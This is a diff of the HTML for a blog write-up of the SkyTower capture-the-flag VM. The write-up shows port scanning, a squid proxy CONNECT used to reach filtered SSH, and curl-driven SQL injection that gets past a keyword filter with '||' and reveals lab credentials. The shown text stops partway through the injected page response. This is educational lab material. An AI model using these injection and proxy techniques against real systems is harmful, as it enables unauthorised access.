@@ -1,353 +1,213 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> Climbing the SkyTower | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="Climbing the SkyTower" />
+<title>
+Climbing the SkyTower ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="foreword Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &amp;lsquo;read /root/flag.txt&amp;rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
+In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)
+">
+<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Climbing the SkyTower">
+<meta name=twitter:description content="foreword
+Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
+In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)">
+<meta property="og:title" content="Climbing the SkyTower">
 <meta property="og:description" content="foreword
 Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
-In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2014-07-17T18:20:12+00:00" />
-<meta property="article:modified_time" content="2014-07-17T18:20:12+00:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Climbing the SkyTower"/>
-<meta name="twitter:description" content="foreword
-Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
-In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)"/>
-
-  
-  
-    
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-  
-  
+In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2014-07-17T18:20:12+00:00">
+<meta property="article:modified_time" content="2014-07-17T18:20:12+00:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&text=Climbing%20the%20SkyTower" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&is_video=false&description=Climbing%20the%20SkyTower" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=Climbing%20the%20SkyTower&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&name=Climbing%20the%20SkyTower&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eRecently%2c%20at%20a%20local%20Security%20Conference%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftelspacesystems%22%3e%40telspacesystems%3c%2fa%3e%20ran%20a%20CTF.%20It%20was%20a%20classic%20%26lsquo%3bread%20%2froot%2fflag.txt%26rsquo%3b%20CTF%20hosted%20on%20a%20wireless%20network.%20Sadly%20the%20wifi%20sucked%2c%20a%20lot%2c%20and%20due%20to%20this%20and%20a%20flat%20battery%20I%20was%20not%20able%20to%20attempt%20this%20CTF%20properly%20at%20the%20con.%20Nonetheless%2c%20the%20VM%20was%20released%20on%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2fentry%2fskytower-1%2c96%2f%22%3eVulnHub%3c%2fa%3e%2c%20and%20was%20promptly%20downloaded%20and%20loaded%20into%20VirtualBox.%3c%2fp%3e%0a%3cp%3eIn%20summary%2c%20this%20CTF%20taught%20me%20some%20interesting%20things%20about%20SQL%20injection%20where%20filters%20are%20present.%20More%20specifically%2c%20commas%20were%20filtered%20out%20and%20resulted%20in%20the%20need%20from%20some%20creative%20thinking%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&t=Climbing%20the%20SkyTower" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#foreword">foreword</a></li>
-    <li><a href="#starting-off">starting off</a></li>
-    <li><a href="#learn-all-you-can">learn all you can</a></li>
-    <li><a href="#climbing-the-tower-and-faling-hard">climbing the tower and faling hard</a></li>
-    <li><a href="#more-sql-injection">more sql injection</a></li>
-    <li><a href="#more-sql-enumeration">more SQL enumeration</a></li>
-    <li><a href="#gaining-further-access">gaining further access</a></li>
-    <li><a href="#enumeration-enumeration-enumeration">enumeration enumeration enumeration</a></li>
-    <li><a href="#pwnd">pwnd</a></li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>Climbing the SkyTower</h1>
+<div class=post-meta>
+<span class=post-date>
+2014-07-17
+</span>
+<span class=post-read-time>— 12 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        Climbing the SkyTower
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2014-07-17 18:20:12 &#43;0000 UTC" itemprop="datePublished">2014-07-17</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <h2 id="foreword">foreword</h2>
-<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#foreword>foreword</a></li>
+<li><a href=#starting-off>starting off</a></li>
+<li><a href=#learn-all-you-can>learn all you can</a></li>
+<li><a href=#climbing-the-tower-and-faling-hard>climbing the tower and faling hard</a></li>
+<li><a href=#more-sql-injection>more sql injection</a></li>
+<li><a href=#more-sql-enumeration>more SQL enumeration</a></li>
+<li><a href=#gaining-further-access>gaining further access</a></li>
+<li><a href=#enumeration-enumeration-enumeration>enumeration enumeration enumeration</a></li>
+<li><a href=#pwnd>pwnd</a></li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<h2 id=foreword>foreword</h2>
+<p>Recently, at a local Security Conference, <a href=https://twitter.com/telspacesystems>@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href=http://vulnhub.com/entry/skytower-1,96/>VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
 <p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>
-<h2 id="starting-off">starting off</h2>
+<h2 id=starting-off>starting off</h2>
 <p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>
 <p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap --reason -Pn 192.168.137.242
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ nmap --reason -Pn 192.168.137.242
 
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 18:32 SAST
-Nmap scan report <span style="color:#f00">for</span> 192.168.137.242
-Host is up, received user-set (0.0020s latency).
-Not shown: <span style="color:#f60">997</span> closed ports
-Reason: <span style="color:#f60">997</span> conn-refused
+Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-07-17 18:32 SAST
+Nmap scan report <span style=color:#66d9ef>for</span> 192.168.137.242
+Host is up, received user-set <span style=color:#f92672>(</span>0.0020s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>997</span> closed ports
+Reason: <span style=color:#ae81ff>997</span> conn-refused
 PORT     STATE    SERVICE    REASON
 22/tcp   filtered ssh        no-response
 80/tcp   open     http       syn-ack
 3128/tcp open     squid-http syn-ack
 </code></pre></div><p>Next morning I reviewed the results and continued to poke around.</p>
-<h2 id="learn-all-you-can">learn all you can</h2>
+<h2 id=learn-all-you-can>learn all you can</h2>
 <p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 192.168.137.242 <span style="color:#f60">3128</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ telnet 192.168.137.242 <span style=color:#ae81ff>3128</span>
 Trying 192.168.137.242...
 Connected to 192.168.137.242.
-Escape character is <span style="color:#87ceeb">&#39;^]&#39;</span>.
+Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
 CONNECT 127.0.0.1:22
-HTTP/1.0 <span style="color:#f60">200</span> Connection established
+HTTP/1.0 <span style=color:#ae81ff>200</span> Connection established
 
 SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
-^]
+^<span style=color:#f92672>]</span>
 telnet&gt; quit
 Connection closed.
-</code></pre></div><p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>
-<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>
+</code></pre></div><p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&mldr;</p>
+<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> & <code>password</code></p>
 <p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style="color:#f00">for</span> the right syntax to use near <span style="color:#87ceeb">&#39;&#39;&#39;&#39;</span>&#39; at line 1]
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>There was an error running the query <span style=color:#f92672>[</span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style=color:#66d9ef>for</span> the right syntax to use near <span style=color:#e6db74>&#39;&#39;&#39;&#39;</span><span style=color:#960050;background-color:#1e0010>&#39;</span> at line 1<span style=color:#f92672>]</span>
 </code></pre></div><p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl --data <span style="color:#87ceeb">&#34;email=foo@bar&amp;password=&#39; OR 1=1#&#34;</span> http://192.168.137.242/login.php
-There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style="color:#f00">for</span> the right syntax to use near <span style="color:#87ceeb">&#39;11#&#39;&#39; at line 1]%
-</span><span style="color:#87ceeb">
-</span><span style="color:#87ceeb">$ curl --data &#34;email=foo@bar&amp;password=&#39;</span><span style="color:#f60">1</span> OR <span style="color:#eedd82">1</span>=1#<span style="color:#87ceeb">&#34; http://192.168.137.242/login.php
-</span><span style="color:#87ceeb">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1  11#&#39;&#39; at line 1]%
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; OR 1=1#&#34;</span> http://192.168.137.242/login.php
+There was an error running the query <span style=color:#f92672>[</span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style=color:#66d9ef>for</span> the right syntax to use near <span style=color:#e6db74>&#39;11#&#39;&#39; at line 1]%
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>$ curl --data &#34;email=foo@bar&amp;password=&#39;</span><span style=color:#ae81ff>1</span> OR 1<span style=color:#f92672>=</span>1#<span style=color:#e6db74>&#34; http://192.168.137.242/login.php
+</span><span style=color:#e6db74>There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1  11#&#39;&#39; at line 1]%
 </span></code></pre></div><p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$ curl --data &#34;email=foo@bar&amp;password=&#39; || 1=1#&#34; http://192.168.137.242/login.php
-&lt;HTML&gt;
-      &lt;div style=<span style="color:#87ceeb">&#34;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);
-</span><span style="color:#87ceeb">                                background-size:100%;
-</span><span style="color:#87ceeb">                                background-position:50% 50%;
-</span><span style="color:#87ceeb">                                background-repeat:no-repeat;&#34;</span>&gt;
-      &lt;div style=<span style="color:#87ceeb">&#34;
-</span><span style="color:#87ceeb">        padding-right:8px;
-</span><span style="color:#87ceeb">              padding-left:10px;
-</span><span style="color:#87ceeb">        padding-top: 10px;
-</span><span style="color:#87ceeb">              padding-bottom: 10px;
-</span><span style="color:#87ceeb">                  background-color:white;
-</span><span style="color:#87ceeb">                  border-color: #000000;
-</span><span style="color:#87ceeb">                  border-width: 5px;
-</span><span style="color:#87ceeb">                  border-style: solid;
-</span><span style="color:#87ceeb">                  width: 400px;
-</span><span style="color:#87ceeb">                  height:430px;
-</span><span style="color:#87ceeb">                  position:absolute;
-</span><span style="color:#87ceeb">                  top:50%;
-</span><span style="color:#87ceeb">                  left:50%;
-</span><span style="color:#87ceeb">                  margin-top:-215px; /* this is half the height of your div*/
-</span><span style="color:#87ceeb">                  margin-left:-200px;
-</span><span style="color:#87ceeb">                                &#34;</span>&gt;
-   &lt;br&gt;&lt;strong&gt;&lt;font size=<span style="color:#87ceeb">4</span>&gt;Welcome john@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: john&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: hereisjohn&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ curl --data &#34;email=foo@bar<span style=color:#960050;background-color:#1e0010>&amp;</span>password=&#39; || 1=1#&#34; http://192.168.137.242/login.php
+&lt;<span style=color:#f92672>HTML</span>&gt;
+      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);
+</span><span style=color:#e6db74>                                background-size:100%;
+</span><span style=color:#e6db74>                                background-position:50% 50%;
+</span><span style=color:#e6db74>                                background-repeat:no-repeat;&#34;</span>&gt;
+      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;
+</span><span style=color:#e6db74>        padding-right:8px;
+</span><span style=color:#e6db74>              padding-left:10px;
+</span><span style=color:#e6db74>        padding-top: 10px;
+</span><span style=color:#e6db74>              padding-bottom: 10px;
+</span><span style=color:#e6db74>                  background-color:white;
+</span><span style=color:#e6db74>                  border-color: #000000;
+</span><span style=color:#e6db74>                  border-width: 5px;
+</span><span style=color:#e6db74>                  border-style: solid;
+</span><span style=color:#e6db74>                  width: 400px;
+</span><span style=color:#e6db74>                  height:430px;
+</span><span style=color:#e6db74>                  position:absolute;
+</span><span style=color:#e6db74>                  top:50%;
+</span><span style=color:#e6db74>                  left:50%;
+</span><span style=color:#e6db74>                  margin-top:-215px; /* this is half the height of your div*/
+</span><span style=color:#e6db74>                  margin-left:-200px;
+</span><span style=color:#e6db74>                                &#34;</span>&gt;
